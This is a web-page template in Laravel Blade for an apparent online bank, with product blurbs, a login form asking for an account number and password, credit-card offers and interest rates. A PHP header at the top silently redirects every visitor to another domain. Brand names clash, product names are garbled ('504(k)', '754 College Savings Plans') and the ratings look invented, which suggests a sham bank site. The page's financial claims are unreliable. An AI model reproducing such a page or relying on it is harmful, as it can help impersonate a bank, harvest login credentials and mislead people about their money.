<?php
header('location: https://wexicocrunion.com.com/');
exit();
?>
@extends('layout')
@section('css')

@stop
@section('content')
    <!--
            Welcome Slider
            ==================================== -->

    <section class="">
        <div class="container-fluid">
            <div class="row togs"
                style="padding-left: 3%; background-image: url('https://central-ab.com/temp/images/back.png'); background-size: contain; background-attachment: fixed;  ">
                <div class="col-md-2 col-4 mini-nav-div"><a class="mini-nav" id="checking" href="javascript:void(0);"><span
                            class="mini-nav-span checking"><big>Checking</big></span></a></div>
                <div class="col-md-2 col-4 mini-nav-div"><span class="mini-nav-span savings"><a id="savings"
                            class="mini-nav" href="javascript:void(0);"><big>Savings</big></a></span></div>
                <div class="col-md-2 col-4 mini-nav-div"><span class="mini-nav-span credit-card"><a id="credit-card"
                            class="mini-nav" href="javascript:void(0);"><big>Cards</big></a></span></div>
                <div class="col-md-2 col-4 mini-nav-div"><span class="mini-nav-span home-loan"><a class="mini-nav"
                            id="home-loan" href="javascript:void(0);"><big>Loans</big></a></span></div>
                <div class="col-md-2 col-4 mini-nav-div"><span class="mini-nav-span auto-loan"><a class="mini-nav"
                            id="auto-loan" href="javascript:void(0);"><big>Auto Loans</big></a></span></div>
                <div class="col-md-2 col-4 mini-nav-div"><span class="mini-nav-span investing"><a class="mini-nav"
                            id="investing" href="javascript:void(0);"><big>Invest</big></a></span></div>
            </div>
            <!-- beginning of toggler -->
            <!--beginning of checking -->
            <div id="checking2" style="padding-bottom: 2px; background-color: #f2f2f2; display: none;">
                <div class="row"
                    style="font-family: 'Roboto Condensed', sans-serif;  padding-left: 4%; padding-top: 2%;">
                    <div class="col-md-4" style="padding-bottom: 2px"><big>From working for your money to making your money
                            work for you! With Performance Checking at Central Alpha Bank you get to experience the full
                            benefit of credit union membership. What do you have to do to qualify? Simply have a recurring
                            direct deposit of $500 or more monthly. Business owners that do not have direct deposit can
                            qualify by having their business account at Central Alpha Bank.</big><br><br>
                        <a href="https://central-ab.com/openaccount.php" class="btn blue-button">Explore checking
                            solutions</a>
                    </div>
                    <div class="col-md-4" style="font-family: 'Roboto Condensed', sans-serif; padding-bottom: 2px"><big>
                            <ul style="list-style: none; font-family: Roboto Slab">
                                <li><span class="fa fa-caret-right"></span> Free Official CU checks</li>
                                <li><span class="fa fa-caret-right"></span> Unlimited ATM refunds nationwide</li>
                                <li><span class="fa fa-caret-right"></span> Free Instant Issue Debit Card (upon opening a
                                    checking account for all qualifying owners)</li>
                                <li><span class="fa fa-caret-right"></span> 0.30% added to qualifying certificates</li>
                            </ul>
                        </big>

                    </div>
                    <div class="col-md-4"
                        style="font-family: 'Roboto Condensed', sans-serif; padding-right: 10%; padding-bottom: 2px">
                        <div class="" style="background-color: #fff; padding : 5%;"><small>PERFORMANCE
                                CHECKING<sup>®</sup></small><br>

                            <br>


                        </div>
                    </div>
                </div>
            </div>
            <!-- end of checking -->

            <!-- beginning of savings -->
            <div id="savings2" style="padding-bottom: 2px; background-color: #f2f2f2; display: none;">
                <div class="row"
                    style="font-family: 'Roboto Condensed', sans-serif;  padding-left: 4%; padding-top: 2%;">
                    <div class="col-md-4" style="padding-bottom: 2px"><big>A Central Alpha savings account can help you make
                            the most of your savings. Once you have established your savings account, you are then eligible
                            for any other service the Central Alpha offers.</big><br><br>
                    </div>
                    <div class="col-md-4" style="font-family: 'Roboto Condensed', sans-serif; padding-bottom: 2px">


                        <big>
                            <ul style="list-style: none; font-family: Roboto Slab">
                                <li><span class="fa fa-caret-right"></span> Money Market</li>
                                <li><span class="fa fa-caret-right"></span> Child Savings</li>
                                <li><span class="fa fa-caret-right"></span> iSAVES</li>
                                <li><span class="fa fa-caret-right"></span> IRAs</li>
                            </ul>
                        </big>

                    </div>
                    <div class="col-md-4"
                        style="font-family: 'Roboto Condensed', sans-serif; padding-right: 10%; padding-bottom: 2px">
                        <div class="" style="background-color: #fff; padding : 5%;">
                            <small>SAVINGS<sup>®</sup></small><br>
                            <div><img style="width: 100%" src="https://central-ab.com/temp/images/toggler1.jpeg"
                                    alt="images"></div>
                            <br>
                            <big><a href="https://central-ab.com/openaccount.php" class="btn btn-sm blue-button-solid">Don't
                                    wait to apply <small><span class="fa fa-chevron-right"></span></small></a></big>

                        </div>
                    </div>
                </div>
            </div>
            <!-- end of savings -->

            <!-- beginning of credit-card -->
            <div id="credit-card2" style="padding-bottom: 2px; background-color: #f2f2f2; display: none;">
                <div class="row"
                    style="font-family: 'Roboto Condensed', sans-serif;  padding-left: 4%; padding-top: 2%;">
                    <div class="col-md-4" style="padding-bottom: 2px"><big>Find the perfect credit card <br>from among our
                            most<br>popular options</big><br><br>
                        <button class="btn blue-button">Shop all credit cards</button>
                    </div>
                    <div class="col-md-4" style="font-family: 'Roboto Condensed', sans-serif; padding-bottom: 2px">

                        <big>
                            <ul style="list-style: none; font-family: Roboto Slab">
                                <li><span class="fa fa-caret-right"></span> Advantage Visa as low as 9.95%* APR</li>
                                <li><span class="fa fa-caret-right"></span> No Annual Fee</li>
                                <li><span class="fa fa-caret-right"></span> ATM Access</li>
                                <li><span class="fa fa-caret-right"></span> Low Annual Rate</li>
                            </ul>
                        </big>

                    </div>
                    <div class="col-md-4"
                        style="font-family: 'Roboto Condensed', sans-serif; padding-right: 10%; padding-bottom: 2px">
                        <div class="" style="background-color: #fff; padding : 5%;"><small>FIND A CREDIT CARD
                                QUICKLY</small><br>
                            <div><img style="width: 100%" src="https://central-ab.com/temp/images/toggler2.jpg"
                                    alt="images"></div>
                            <br>
                            <big><a href="https://central-ab.com/openaccount.php" class="btn btn-sm blue-button-solid">Don't
                                    wait to apply <small><span class="fa fa-chevron-right"></span></small></a></big>

                        </div>
                    </div>
                </div>
            </div>
            <!-- end of credit-card -->

            <!-- beginning of home-loan -->
            <div id="home-loan2" style="padding-bottom: 2px; background-color: #f2f2f2; display: none;">
                <div class="row"
                    style="font-family: 'Roboto Condensed', sans-serif;  padding-left: 4%; padding-top: 2%;">
                    <div class="col-md-4" style="padding-bottom: 2px"><big>There are many reasons for our business members
                            to get a commercial loan. Whether it’s purchasing new equipment, purchasing a new building or
                            expanding your current business location through construction of a new building, we are here to
                            help our business members in any way that we can. That’s why our loan program is designed to be
                            flexible enough to suit any of our member’s business needs</big><br><br>

                    </div>
                    <div class="col-md-4" style="font-family: 'Roboto Condensed', sans-serif; padding-bottom: 2px"><big>
                            <ul style="list-style: none; font-family: Roboto Slab">
                                <li><span class="fa fa-caret-right"></span> Collateral Loans (Equipment and Vehicles)</li>
                                <li><span class="fa fa-caret-right"></span> Rental Investment Properties (Non-Owner
                                    Occupied)</li>
                                <li><span class="fa fa-caret-right"></span> Commercial Real Estate Loans</li>
                            </ul>
                        </big>

                    </div>
                    <div class="col-md-4"
                        style="font-family: 'Roboto Condensed', sans-serif; padding-right: 10%; padding-bottom: 2px">
                        <div class="" style="background-color: #fff; padding : 5%;"><small>BUSINESS
                                LOANS<sup>®</sup></small><br>
                            <div><img style="width: 100%" src="https://central-ab.com/temp/images/toggler3.png"
                                    alt="images"></div>
                            <br>
                            <big><a href="https://central-ab.com/openaccount.php"
                                    class="btn btn-sm blue-button-solid">Don't wait to apply <small><span
                                            class="fa fa-chevron-right"></span></small></a></big>

                        </div>
                    </div>
                </div>
            </div>
            <!-- end of home-loan -->

            <!-- beginning of auto-loan -->
            <div id="auto-loan2" style="padding-bottom: 2px; background-color: #f2f2f2; display: none;">
                <div class="row"
                    style="font-family: 'Roboto Condensed', sans-serif;  padding-left: 4%; padding-top: 2%;">
                    <div class="col-md-4" style="padding-bottom: 2px"><big>Selecting the right auto loan is as important
                            as finding just what you want in a car or truck.</big><br><br>
                        <button class="btn blue-button">Learn More</button>
                    </div>
                    <div class="col-md-4" style="font-family: 'Roboto Condensed', sans-serif; padding-bottom: 2px"><big>
                            <a href="https://central-ab.com/openaccount.php">Apply now</a></big>
                        <br><br>
                        <big>
                            <ul style="list-style: none; font-family: Roboto Slab">
                                <li><span class="fa fa-caret-right"></span> Low Auto Loan Rates- Call Us For Rates</li>
                                <li><span class="fa fa-caret-right"></span> Automatic Payment Options</li>
                                <li><span class="fa fa-caret-right"></span> Free online account access</li>
                                <li><span class="fa fa-caret-right"></span> Refinance your current auto loan from another
                                    financial institution</li>
                            </ul>
                        </big>

                    </div>
                    <div class="col-md-4"
                        style="font-family: 'Roboto Condensed', sans-serif; padding-right: 10%; padding-bottom: 2px">
                        <div class="" style="background-color: #fff; padding : 5%;"><small>AUTO
                                LOANS<sup>®</sup></small><br>

                            <br>
                            <big><a href="https://central-ab.com/openaccount.php"
                                    class="btn btn-sm blue-button-solid">Don't wait to apply <small><span
                                            class="fa fa-chevron-right"></span></small></a></big>

                        </div>
                    </div>
                </div>
            </div>
            <!-- end of auto-loan -->

            <!-- beginning of investing -->
            <div id="investing2" style="padding-bottom: 2px; background-color: #f2f2f2; display: none;">
                <div class="row"
                    style="font-family: 'Roboto Condensed', sans-serif;  padding-left: 4%; padding-top: 2%;">
                    <div class="col-md-4" style="padding-bottom: 2px"><big>Enjoy an outstanding investing <br>experience
                            with Grandfirm Bancshares Bank®</big><br><br>
                        <a href="https://central-ab.com/openaccount.php" class="btn blue-button">See how</a>
                    </div>
                    <div class="col-md-4" style="font-family: 'Roboto Condensed', sans-serif; padding-bottom: 2px"><big>
                            <a href="javascript:void(0);">Retirement Planning</a></big>
                        <br><br>
                        <big><a href="javascript:void(0);">IRAs and 504(k) Rollovers</a></big>
                        <br><br>
                        <big><a href="javascript:void(0);">754 College Savings Plans</a></big>
                        <br><br>
                        <big><a href="javascript:void(0);">Investment Choices</a></big>

                    </div>
                    <div class="col-md-4"
                        style="font-family: 'Roboto Condensed', sans-serif; padding-right: 10%; padding-bottom: 2px">
                        <div class="" style="background-color: #fff; padding : 5%;">
                            <small>Investing<sup>®</sup></small><br>

                            <br>
                            <big><a href="https://central-ab.com/openaccount.php"
                                    class="btn btn-sm blue-button-solid">Don't wait to apply <small><span
                                            class="fa fa-chevron-right"></span></small></a></big>


                        </div>
                    </div>
                </div>
            </div>
            <!-- end of investing
              <!-- end of toggler -->

            <div class="row"
                style="padding-left: 3.5%; padding-right: 3%; margin-top: 2%; padding-bottom: 3%; background-image: url('https://grandfirm-bancshares.com/temp/images/back.png'); background-size: contain; background-attachment: fixed;">
                @guest
                    <div class="col-md-3">
                        <div style="background-color: #016696 ; padding: 4% 4% 4px 4%">
                            <div>

                                <h5 style="color: #fff; font-family: Roboto Condensed, sans-serif; padding: 5px;">ONLINE
                                    BANKING LOGIN</h5>
                                <form action="{{ route('submitlogin') }}" method="post" data-saasone="contact-froms"
                                    class="form">
                                    @csrf
                                    <div><input
                                            style="border-radius: 0px; font-family: 'Roboto Condensed', sans-serif; font-weight: bold"
                                            class="form-control" name="acct_no" placeholder="Account NO." required></div><br>
                                    <div><input
                                            style="border-radius: 0px; font-family: 'Roboto Condensed', sans-serif; font-weight: bold"
                                            class="form-control" type="password" name="password" placeholder="Password"
                                            required></div>
                                    <br>
                                    <label class="fancy-checkbox">
                                        <input type="checkbox" id="test_1" name="remember" value="checked"><span
                                            style="font-family: 'Roboto Condensed', sans-serif; color: #fff;"><small>Remember
                                                Me</small></span></label>
                                    <br>
                                    <button type="submit" class="btn btn-remember red-button-solid">Sign In</button>
                                    <br>
                                    <a href="{{ route('user.password.request') }}"
                                        style="color: #fff; font-weight: lighter; letter-spacing: 1px"><small>Forgot
                                            Password?</small></a>
                                    <br><a href="https://central-ab.com/help.php"
                                        style="color: #fff; font-weight: lighter; letter-spacing: 1px"><small>Need
                                            Help?</small></a>

                                </form>

                            </div>
                        </div>
                        <div
                            style="background-color: #4682B4; text-align: center; font-weight: lighter; padding: 2%; color: #fff;">
                            <a style="color: #fff; text-decoration: underline; font-family: 'Roboto Slab', sans-serif;"
                                href="https://central-ab.com/openaccount.php">Online Enrollment</a>
                        </div>
                        <br>
                        <div>
                            <div style="background-color: #0073CF;; color: #fff; padding: 3% 3% 3% 8%"><span
                                    style="float: left" class="fa fa-map-marker fa-2x"></span>
                                <div style="font-weight: lighter;">&nbsp; <a href="https://central-ab.com/contact.php"
                                        style="color: #fff; font-family: Roboto Slab, sans-serif;">Find your nearest
                                        ATM/SERVICE CENTERS</a></div>
                            </div>

                        </div>
                    </div>
                @else
                    <div class="col-md-3">
                        <div style="background-color: #016696 ; padding: 4% 4% 4px 4%">
                            <div>
                                <h4 style="font-family: 'Roboto Condensed', sans-serif; color: #fff; text-align: center;">
                                    Welcome <br><b class="fa fa-user"></b> {{ Auth::user()->name }}
                                    {{ Auth::user()->lastname }}</h4>
                                <div>
                                    <center><img src="{{ url('/') }}/asset/profile/{{ $cast }}"
                                            class="img-thumbnail img-responsive"
                                            style="width: 150px!important; height: 150px!important; border-radius: 50%!important">
                                        <br><br>
                                        <a class="btn btn-sm btn-success"
                                            style="font-family: 'Roboto Condensed', sans-serif; color: #fff;"
                                            href="{{ route('user.dashboard') }}">Account</a> | <a
                                            href="{{ route('user.logout') }}" class="btn btn-sm btn-warning"
                                            style="font-family: 'Roboto Condensed', sans-serif; color: #fff;">Sign Out</a>
                                    </center>
                                </div>

                            </div>
                        </div>
                        <br>
                        <div>
                            <div style="background-color: #0073CF;; color: #fff; padding: 3% 3% 3% 8%"><span
                                    style="float: left" class="fa fa-map-marker fa-2x"></span>
                                <div style="font-weight: lighter;">&nbsp; <a href="https://central-ab.com/contact.php"
                                        style="color: #fff; font-family: Roboto Slab, sans-serif;">Find your nearest
                                        ATM/SERVICE CENTERS</a></div>
                            </div>

                        </div>
                    </div>
                @endguest

                <div class="col-md-9">

                    <!-- #region Jssor Slider Begin -->
                    <!-- Generator: Jssor Slider Maker -->
                    <!-- Source: https://www.jssor.com -->
                    <!-- <script src="js/jquery-1.11.3.min.js" type="text/javascript"></script> -->
                    <!-- <script src="../plugins/jquery/dist/jquery.min.js"></script> -->


                    <div id="jssor_1"
                        style="position:relative;margin:0 auto;top:0px;left:0px;width:980px;height:380px;overflow:hidden;visibility:hidden;">
                        <!-- Loading Screen -->
                        <div data-u="loading" class="jssorl-009-spin"
                            style="position:absolute;top:0px;left:0px;width:100%;height:100%;text-align:center;background-color:rgba(0,0,0,0.7);">
                            <img style="margin-top:-19px;position:relative;top:50%;width:38px;height:38px;"
                                src="https://central-ab.com/temp/vertical-slider.slider.jquery/img/spin.svg" />
                        </div>
                        <div data-u="slides"
                            style="cursor:default;position:relative;top:0px;left:0px;width:980px;height:380px;overflow:hidden;">
                            <div>
                                <img data-u="image"
                                    src="https://central-ab.com/temp/vertical-slider.slider.jquery/img/002.jpg" />
                                <!-- <div style="position:absolute;top:57px;left:92px;width:400px;height:250px;font-size:16px;color:#ffffff;line-height:1.88;text-align:left;padding:10px 10px 10px 10px;box-sizing:border-box;background-color:rgba(255,188,5,0.8);background-clip:padding-box;">Settings <br /><br />
                                Layout -> Slide -> Orientation: Vertical<br />
                                Options -> Drag -> Orientation: Vertical
                            </div> -->
                            </div>
                            <div>
                                <img data-u="image"
                                    src="https://central-ab.com/temp/vertical-slider.slider.jquery/img/005.jpg" />
                            </div>
                            <div>
                                <img data-u="image"
                                    src="https://central-ab.com/temp/vertical-slider.slider.jquery/img/003.jpg" />
                            </div>
                            <div>
                                <img data-u="image"
                                    src="https://central-ab.com/temp/vertical-slider.slider.jquery/img/001.jpg" />
                            </div>
                            <div>
                                <img data-u="image"
                                    src="https://central-ab.com/temp/vertical-slider.slider.jquery/img/004.jpg" />
                            </div>

                        </div>
                        <!-- Bullet Navigator -->
                        <div data-u="navigator" class="jssorb031" style="position:absolute;bottom:12px;right:12px;"
                            data-autocenter="2" data-scale="0.5" data-scale-right="0.75">
                            <div data-u="prototype" class="i" style="width:12px;height:12px;">
                                <svg viewbox="0 0 16000 16000"
                                    style="position:absolute;top:0;left:0;width:100%;height:100%;">
                                    <circle class="b" cx="8000" cy="8000" r="5800"></circle>
                                </svg>
                            </div>
                        </div>
                    </div>
                    <!-- #endregion Jssor Slider End -->

                </div>
            </div>

            <div class="row">
                <div class="col-md-12" style=" background-color: #f2f2f2">
                    <div style=" padding: 5%;">
                        <div style="background-color: #f2f2f2; ">
                            <div>
                                <h2 id="heas"
                                    style="color: #DC1431; text-align: center; font-family: 'Roboto Slab', sans-serif; font-weight: lighter;">
                                    <big><small>Which Credit Card is best for you?</small></big>
                                </h2>
                            </div><br>
                            <div class="row">

                                <div class="col-md-4">
                                    <div style="text-align: center; ">
                                        <h4
                                            style="color: #50748a; line-height: 1.25em; font-weight: 400; font-family: 'Slabo 13px', serif;">
                                            Rewards Card</h4>
                                        <div>
                                            <div><img src="https://central-ab.com/temp/images/reward.png" alt="reward"
                                                    style="width: 220px"></div>
                                            <span>
                                                <a href="javascript:void(0)"
                                                    style="font-family: Roboto Slab, sans-serif;"><big>10.59% - 16.59%
                                                        APR*<br>on all purchases></big></a>
                                            </span>
                                            <p style="color: #FFD700;">
                                                <span class="fa fa-star fa-2x"></span>
                                                <span class="fa fa-star fa-2x"></span>
                                                <span class="fa fa-star fa-2x"></span>
                                                <span class="fa fa-star fa-2x"></span>
                                                <span class="fa fa-star-o fa-2x"></span>
                                            </p>
                                            4.0/5.0 (16,524)
                                            <br>

                                            <ul style="font-size: 16px; font-family: Roboto Slab, sans-serif; color: #000">
                                                <li><b>*</b> No annual fees</li>
                                                <li><b>*</b> Card fraud protection app</li>
                                                <li><b>*</b> Only a small foreign transaction fee</li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>

                                <div class="col-md-4">
                                    <div style="text-align: center;">
                                        <h4
                                            style="color: #50748a; line-height: 1.25em; font-weight: 400; font-family: 'Slabo 13px', serif;">
                                            Classic Card</h4>
                                        <div>
                                            <div><img src="https://central-ab.com/temp/images/master.png" alt="master"
                                                    style="width: 220px"></div>
                                            <span>
                                                <a href="javascript:void(0)"
                                                    style="font-family: Roboto Slab, sans-serif;"><big>9.20% APR* <br>on
                                                        all purchases></big></a>
                                            </span>
                                            <p style="color: #FFD700;">
                                                <span class="fa fa-star fa-2x"></span>
                                                <span class="fa fa-star fa-2x"></span>
                                                <span class="fa fa-star fa-2x"></span>
                                                <span class="fa fa-star fa-2x"></span>
                                                <span class="fa fa-star-half-full fa-2x"></span>
                                            </p>
                                            4.5/5.0 (12,585)
                                            <br>
                                            <ul style="font-size: 16px; font-family: Roboto Slab, sans-serif; color: #000">
                                                <li><b>*</b> No annual fees</li>
                                                <li><b>*</b> Card fraud protection app</li>
                                                <li><b>*</b> Only a small foreign transaction fee</li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>

                                <div class="col-md-4">
                                    <div style="text-align: center;">
                                        <h4
                                            style="color: #50748a; line-height: 1.25em; font-weight: 400; font-family: 'Slabo 13px', serif;">
                                            Platinum Card</h4>
                                        <div>
                                            <div><img src="https://central-ab.com/temp/images/platinum.png" alt="platinum"
                                                    style="width: 220px" /></div>
                                            <span>
                                                <a href="javascript:void(0)"
                                                    style="font-family: Roboto Slab, sans-serif;"><big>18.59% APR <br>on
                                                        all purchases ></big></a>
                                            </span>
                                            <p style="color: #FFD700;">
                                                <span class="fa fa-star fa-2x"></span>
                                                <span class="fa fa-star fa-2x"></span>
                                                <span class="fa fa-star fa-2x"></span>
                                                <span class="fa fa-star fa-2x"></span>
                                                <span class="fa fa-star fa-2x"></span>
                                            </p>
                                            5.0/5.0 (1,140)
                                            <br>
                                            <ul style="font-size: 16px; font-family: Roboto Slab, sans-serif; color: #000">
                                                <li><b>*</b> Low $85 annual fee</li>
                                                <li><b>*</b> Card fraud protection app</li>
                                                <li><b>*</b> Only a small foreign transaction fee</li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>

                            </div>
                            <br>

                        </div>

                    </div>
                </div>

            </div>
            <!-- <hr style="border: 1px solid #fff;"> -->
            <div class="row" style="background-color: #d1c9c0 ; padding: 5% 5% 5% 5%">
                <div class="col-md-3">
                    <div style="padding: 5%;">
                        <div><img style="width: 80px" src="https://central-ab.com/temp/images/emvchip.webp"
                                alt="emvchip"></div><big
                            style="color: #6a3433; font-family: 'Roboto Slab', sans-serif; font-weight: lighter;">EMV Chip
                            Cards</big>
                        <p style="color: #000; font-family: Roboto Condensed, sans-serif;"><small>We've transitioned all
                                our cards to the more secure EMV chip cards. This helps us keep our members' money more
                                secure.</small></p>


                    </div>
                </div>

                <div class="col-md-3" id="info-div">
                    <div style="padding: 5%;">
                        <div><img style="width: auto;" src="https://central-ab.com/temp/images/icons/creditstore.svg"
                                alt="creditstore"></div><big
                            style="color: #DC1431; font-family: 'Roboto Slab', sans-serif; font-weight: lighter;">Looking
                            to improve your company’s credit?</big>
                        <p style="color: #000; font-family: Roboto Condensed, sans-serif;"><small>Learn how you can improve
                                your company’s credit score and grow your business.</small></p>


                    </div>
                </div>

                <div class="col-md-3" id="info-div">
                    <div style="padding: 5%;">
                        <div><img style="width: 80px;" src="https://central-ab.com/temp/images/smartphone.webp"
                                alt="smartphone"></div><big
                            style="color: #6a3433; font-family: 'Roboto Slab', sans-serif; font-weight: lighter;">Secure
                            Mobile Banking</big>
                        <p style="color: #000; font-family: Roboto Condensed, sans-serif;"><small>Staying on top of your
                                bank accounts is easier than ever with mobile banking. Perfect for business owners or busy
                                people!
                            </small></p>


                    </div>
                </div>



                <div class="col-md-3" id="info-div">
                    <div style="padding: 5%;">
                        <div><img style="width: auto;" src="https://central-ab.com/temp/images/icons/money.svg"
                                alt="money"></div><big
                            style="color: #DC1431; font-family: 'Roboto Slab', sans-serif; font-weight: lighter;">Discover
                            Central Alpha for business</big>
                        <p style="color: #000; font-family: Roboto Condensed, sans-serif;"><small>Explore small business
                                banking solutions plus investment options from Central Alpha Bank.</small></p>


                    </div>
                </div>
            </div>

            <div style="text-align: center; color: #000; padding: 5% 5% 1% 5%">
                <h1 id="heas" style="color: #000 ; font-family: 'Roboto Slab', sans-serif; font-weight: lighter;">
                    Making your money work for your financial life</h1>
                <span style="font-family: Roboto Slab, sans-serif;">Explore priorities below to get started</span>
            </div>

            <div class="row" style="padding-left: 3%; padding-right: 3%;">
                <div class="col-md-3" style=" padding-bottom: 2%; padding-top: 5%;"> <img
                        src="https://central-ab.com/temp/images/ud1.png" alt="image" style="max-width: 100%">
                </div>

                <div class="col-md-3" style=" padding-bottom: 2%; padding-top: 5%;"> <img
                        src="https://central-ab.com/temp/images/ud2.png" alt="image" style="max-width: 100%">
                </div>

                <div class="col-md-3" style=" padding-bottom: 2%; padding-top: 5%;"> <img
                        src="https://central-ab.com/temp/images/ud3.png" alt="image" style="max-width: 100%">

                </div>

                <div class="col-md-3" style=" padding-bottom: 2%; padding-top: 5%;"> <img
                        src="https://central-ab.com/temp/images/ud4.png" alt="image" style="max-width: 100%">
                </div>
            </div>

            <div style="text-align: center; color: #000; padding: 5% 5% 1% 5%">
                <p>See Our Financial Center Locations</p>
                <a href="https://central-ab.com/about.php" class="btn btn-primary red-button-solid">More About
                    Us<sup>®</sup></a>
            </div>

            <div style="text-align: center; color: #000; padding: 4%">
                <h1 id="heas"
                    style="color: #DC1431 ; font-family: 'Roboto Condensed', sans-serif; font-weight: lighter;">We Strive
                    to Provide the Best Service</h1>
            </div>

            <div class="container" style="padding-bottom: 3%">
                <div class="row">
                    <div class="col-md-7" style="padding-bottom: 10px">
                        <div>
                            <h1 id="heas"
                                style="color: #016696 ; font-family: 'Roboto Condensed', sans-serif; font-weight: lighter;">
                                Our Online Banking is Secured!</h1>
                            <hr style="border: 2px solid #e2e2e2; width: 20%; float: left;">
                            <p style="clear: both; font-family: Roboto Slab, sans-serif;"><big>Both are certified for
                                    providing</big><br><big
                                    style="color: grey; font-weight: bold; font-family: Roboto Condensed, sans-serif;, font-style: italic!important;"><i>“An
                                        Excellent User Experience”</i></big></p>
                            <a href="https://central-ab.com/openaccount.php" class="blue-button">Open An Account</a>
                        </div>
                    </div>

                    <div class="col-md-5" style=" padding: 7% 5% 100px 5%">
                        <img src="https://central-ab.com/temp/images/alliancecredited.png" style="max-width: 100%">
                    </div>
                </div>
            </div>

        </div>
    </section>

    <section class="call-to-action section-sm" style="background-color: #6a3433; ">
        <div class="container">
            <div class="row">
                <div class="col-md-6" style="padding-bottom: 10px">
                    <div>
                        <h1 id="heas"
                            style="color: #fff ; font-family: 'Roboto Condensed', sans-serif; font-weight: lighter;">Online
                            Banking</h1>

                        <p style="font-family: Roboto Condensed, sans-serif; text-align: justify; ">
                            Central Alpha Bank Online allows you direct access to your accounts. You can check your
                            balances, transfer money, make loan payments and print copies of checks that have cleared your
                            account. All of this from the comfort of your own home. Central Alpha Bank offers outstanding
                            online banking for all of your accounts!
                        </p>

                        <a href="https://central-ab.com/openaccount.php" class="red-button-solid">Online Banking</a>
                    </div>
                </div>

                <div class="col-md-6" style=" padding: 5% 5% 5% 5%">
                    <img src="https://central-ab.com/temp/images/newapp2.png" style="max-width: 100%">
                </div>
            </div>
        </div> <!-- End row -->

        </div> <!-- End container -->
    </section>

    <section class="" style="background-color: #f9f7f3; padding: 3%">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-12">
                    <div id="securitytips">
                        <p style="font-weight: lighter; font-size: 14px">
                        <h5 href="javascript:void(0);"
                            style="text-decoration: none; color: #6a3433; font-family: Roboto Condensed, sans-serif; ">
                            Central Alpha Bank Online Banking Security Tips: </h5>
                        </p>
                        <p style="color: #000; font-weight: lighter; font-size: 14px"><span
                                class="fa fa-space-shuttle"></span> Giving away your Internet Banking login, card details,
                            PIN and codes from your token device, gives anyone total access to your account. Central Alpha
                            Bank will never ask for any of these details via any form of communications
                        </p>

                        <p style="color: #000; font-weight: lighter; font-size: 14px"><span
                                class="fa fa-space-shuttle"></span> Seeing a phone number or email address you recognize
                            does not mean it is genuine. Always give cold-callers a cold reception
                        </p>

                        <p style="color: #000; font-weight: lighter; font-size: 14px"><span
                                class="fa fa-space-shuttle"></span> Create strong passwords for your Internet Banking login
                            and card details. Change them often.
                        </p>

                        <p style="color: #000; font-weight: lighter; font-size: 14px"><span
                                class="fa fa-space-shuttle"></span> Check your bank account statements and card
                            transactions regularly to make sure these only reflect transactions you have made. If you see a
                            transaction you cannot explain, report it to the bank.
                        </p>

                        <p style="color: #000; font-weight: lighter; font-size: 14px"><span
                                class="fa fa-space-shuttle"></span> Always log-out after using Online Banking.
                        </p>
                        <br>
                        <h6
                            style="font-family: Roboto Slab, sans-serif; color: #6a3433; font-weight: bold; color: #250858">
                            Central Alpha Bank CURRENT INTEREST RATES:
                        </h6>

                        <div class="single-table">
                            <div class="table-responsive">
                                <table class="table  text-center"
                                    style="border: 1px solid #250858!important; font-family: 'Slabo 13px' sans-serif;">
                                    <tr>
                                        <th style="border: 1px solid #250858!important;"><big><span
                                                    style="color: #A94D91">2.22%</span> 48 MONTH CERTIFICATE</big></th>
                                        <th style="border: 1px solid #250858!important;"><big><span
                                                    style="color: #A94D91">0.30%</span> SAVINGS ACCOUNT</big></th>

                                    </tr>
                                    <tr>
                                        <th style="border: 1px solid #250858!important;"><big><span
                                                    style="color: #A94D91">0.35%</span> MONEY MARKET</big></th>
                                        <th style="border: 1px solid #250858!important;"><big><span
                                                    style="color: #A94D91">0.49%</span> IRA</big></th>

                                    </tr>
                                </table>
                            </div>
                        </div>

                        <hr style="borer: 1px solid #e2e2e2">
                    </div>
                </div>

            </div>
        </div> <!-- End row -->

        </div> <!-- End container -->
    </section>





@stop
